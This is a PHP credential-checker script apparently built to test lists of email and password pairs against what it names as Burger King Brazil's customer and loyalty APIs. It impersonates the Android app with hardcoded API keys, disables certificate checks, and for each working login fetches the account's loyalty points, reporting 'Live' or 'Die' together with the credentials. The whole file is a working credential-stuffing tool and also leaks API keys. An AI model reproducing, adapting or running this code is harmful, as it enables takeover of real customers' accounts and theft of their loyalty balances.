<?php
error_reporting(0);
/*
* @𝓐𝓾𝓽𝓱𝓸𝓻   𝓟 𝓾 𝓰 𝓷 𝓸
*
* 𝓒𝓸𝓷𝓽𝓪𝓬𝓽   𝓦𝓱𝓪𝓽𝓼𝓪𝓹𝓹  >> (61) 9603-7036 
* 𝓒𝓸𝓷𝓽𝓪𝓬𝓽   𝓣𝓮𝓵𝓮𝓰𝓻𝓪𝓶  >> 𝓽.𝓶𝓮/𝓹𝓾𝓰𝓷𝓸_𝓯𝓬
*
*/
if (file_exists("cookie.txt") !== false) {
    unlink("cookie.txt");
    fopen("cookie.txt", 'w+');
    fclose("cookie.txt");
} else {
    fopen("cookie.txt", 'w+');
    fclose("cookie.txt");
}

function getStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

function multiexplode($string)
{
    $delimiters = array("|", ";", ":", "/", "»", "«", ">", "<");
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}

$lista = $_GET['lista'];
$email = multiexplode($lista)[0];
$senha = multiexplode($lista)[1];

##### FIM DA PARTE BÁSICA ######


#########################
##### FAZER O LOGIN #####
#########################

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://app.api.appbk.burgerking.com.br/crm/api/customer/newauth');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
#curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/cookie.txt");
#curl_setopt($ch, CURLOPT_COOKIEFILE , getcwd()."/cookie.txt");
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'api-key: 8f14ce06-22ce-4de2-8e0d-9ee3ae5dcdd7',
    'x-api-key: T0k5NZkhSF6g4GwqD4UEu5n8GwRtSY741tJrRPNc',
    'content-type: application/json; charset=UTF-8',
    'user-agent: okhttp/3.12.8',

));
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"VersionBlocker":{"AppType":"android","AppVersion":"3.7.14"},"identification":"' . $email . '","securityfield":"' . $senha . '"}');
$p1 = curl_exec($ch);

if (strpos($p1, '"id":"')) {
    $id = getStr($p1, '"id":"', '"');
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.loyalty-prd.appbk.burgerking.com.br/customer/home/'.$id);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/cookie.txt");
    curl_setopt($ch, CURLOPT_COOKIEFILE , getcwd()."/cookie.txt");
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'content-type: application/json',
        'x-api-key: LrJ8T6TNqVs96fqIt0dby77eDHvVuH6kDdKPEA20',
        'user-agent: okhttp/3.12.8',
    ));
    $p2 = curl_exec($ch);
    $pontos = getStr($p2,'"points":',',');
    echo "Live $lista pontos: $pontos";
} else {
    echo "Die $lista";
}
